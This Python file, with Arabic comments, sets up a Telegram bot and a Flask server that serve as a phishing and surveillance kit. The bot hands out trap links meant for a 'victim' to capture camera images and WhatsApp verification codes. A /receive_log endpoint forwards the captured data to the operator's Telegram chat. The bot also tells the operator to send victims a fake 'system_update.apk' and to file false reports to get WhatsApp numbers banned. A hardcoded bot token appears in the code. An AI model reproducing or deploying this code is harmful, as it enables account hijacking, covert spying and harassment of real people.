import telebot
from telebot import types
import os
from flask import Flask, request
import threading

# 1. إعدادات البوت والتوكن الجديد الخاص بك (الذي ظهر في الصورة)
TOKEN = '8468154462:AAHkVqMSAqxBQ6iq-TaSYSVH3B-rZkyQKD8'
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# 2. رابط السيرفر الخاص بك على Render (تأكد من صحته)
BASE_URL = "https://shadow-core-v2.onrender.com"
MY_CHAT_ID = "6190861110"

# 3. بناء لوحة الأزرار عند إرسال /start
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btns = [
        '📸 اختراق الكاميرا', '💬 سحب كود واتساب',
        '🚫 حظر رقم واتساب', '🔓 فك حظر واتساب',
        '📂 السيطرة الكاملة', '🚫 بلاغات تيك توك'
    ]
    markup.add(*(types.KeyboardButton(b) for b in btns))
    bot.send_message(message.chat.id, "💀 **نظام الاختراق والتحكم نشط الآن** 💀\nتم ربط التوكن الجديد بنجاح.", reply_markup=markup, parse_mode='Markdown')

# 4. معالجة ضغطات الأزرار وإرسال الروابط الحقيقية
@bot.message_handler(func=lambda m: True)
def handle_commands(message):
    if 'اختراق الكاميرا' in message.text:
        bot.reply_to(message, f"✅ رابط سحب الصور (أرسله للضحية):\n🔗 {BASE_URL}/cam")
    
    elif 'سحب كود واتساب' in message.text:
        bot.reply_to(message, f"✅ رابط صفحة سحب الأكواد:\n🔗 {BASE_URL}/whatsapp")
    
    elif 'حظر رقم واتساب' in message.text:
        bot.reply_to(message, "⚠️ أرسل 'Lost phone' لـ support@whatsapp.com مع الرقم المطلوب.")
        
    elif 'السيطرة الكاملة' in message.text:
        bot.reply_to(message, "📂 ميزة السيطرة تتطلب رفع ملف system_update.apk وإرساله للضحية.")
        
    else:
        bot.reply_to(message, f"⚙️ جاري معالجة طلب [{message.text}]..")

# 5. نقاط استقبال الضحايا (الفخاخ)
@app.route('/cam')
def cam_page():
    try:
        with open('cam.html', 'r') as f: return f.read()
    except: return "خطأ: تأكد من وجود ملف cam.html في GitHub"

@app.route('/whatsapp')
def wa_page():
    try:
        with open('whatsapp.html', 'r') as f: return f.read()
    except: return "خطأ: تأكد من وجود ملف whatsapp.html في GitHub"

# 6. استقبال البيانات (اللوجات) وإرسالها لك في تليجرام
@app.route('/receive_log', methods=['POST'])
def receive_log():
    data = request.json
    bot.send_message(MY_CHAT_ID, data.get('content'))
    return "OK", 200

# 7. تشغيل البوت والسيرفر معاً
def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    bot.polling(none_stop=True)
